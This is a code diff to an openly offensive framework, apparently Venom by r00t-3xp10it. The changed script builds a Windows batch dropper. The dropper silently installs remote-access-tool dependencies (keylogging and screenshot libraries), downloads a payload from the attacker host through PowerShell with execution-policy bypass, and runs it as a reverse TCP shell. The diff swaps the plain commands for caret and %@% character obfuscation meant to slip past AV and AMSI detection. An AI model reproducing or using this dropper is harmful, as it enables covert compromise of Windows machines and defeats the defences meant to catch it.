@@ -10332,17 +10332,13 @@ if [ "$SOSP" = "Windows" ]; then
    if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
       ## Build dropper.bat (IF: OBFUSCATION=ON | IF: categorie nº8 - Agent nº6)
       echo "${BlueF}[☠]${white} Creating dropper BAT Program."${Reset};sleep 2
-      echo ":: Author: r00t-3xp10it [SSA RedTeam @2020]" > $Drop.bat
-      echo ":: Framework: Venom v1.0.17 - Amsi Evasion - Agent nº6" >> $Drop.bat
-      echo ":: Function: Install python3 SillyRAT requirements before downloading" >> $Drop.bat
-      echo ":: and executing $Drop.py (reverse tcp python shell) in background." >> $Drop.bat
-      echo ":: ---" >> $Drop.bat
-      echo "@echo off" >> $Drop.bat
-      echo "title $Drop - 3.10.5-dev Windows Installer" >> $Drop.bat
+      echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" > $Drop.bat
+      echo ":: Framework: Venom v1.0.17 - shinigami" >> $Drop.bat
+      echo "@echo off&&title $Drop - 3.10.5-dev Windows Installer" >> $Drop.bat
       echo "if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start \"\" /min \"%~dpnx0\" %* && exit" >> $Drop.bat
-      echo "powershell \$C=pip show tabulate;If(-not(\$C)){pip install tabulate pynput psutil pillow pyscreenshot pyinstaller}" >> $Drop.bat
-      echo "powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://$lhost/$Drop.py', '$rpath\\$Drop.py') && cd $rpath && python $Drop.py" >> $Drop.bat
-      echo "${BlueF}[☠]${white} $Drop.bat written to output."${Reset};sleep 2
+      echo "@po%i%we^r%@%sh^e%db%ll \$C=p^i%@%p sh%@%o^w tab%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p ins%@%t^a%@%ll tab%@%u^la%@%te py%@%n^pu%@%t psu%@%t^i%@%l pi%@%l^l%@%ow pys%@%cr^ee%@%ns%@%h^ot pyi%@%ns^t%@%all%@%e^r}" >> $Drop.bat
+      echo ";pow^e%@%rs^he%@%ll -e^x%@%ec b%@%ypa^s%@%s -w 1 -C (Ne%@%W-Obj%@%ect N%i%et.WebCl%@%ie^n%@%t).Dow%@%nl^oa%@%dFil%@%e('h^t%@%t^p:/%@%/$lhost/$Drop.py', '$rpath\\$Drop.py') &%@%& (,;(c%@%d $rpath &%@%& py%@%t^h%@%on $Drop.py),)" >> $Drop.bat
+      echo "${BlueF}[☠]${white} Obfuscated $Drop.bat written to output."${Reset};sleep 2
 
    else
 
@@ -12435,7 +12431,7 @@ cat << !
     OBFUSCATION: Activated or NOT, creates a BAT dropper (amsi evasion)
                  The categorie nº3 => agent nº5 that by default creates a EXE
                  dropper detected by AV soluctions was ported to this categorie
-                 has one BAT dropper that manages to bypass AV/amsi detection.
+                 has one obfuscated BAT dropper that bypass AV/amsi detection.
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
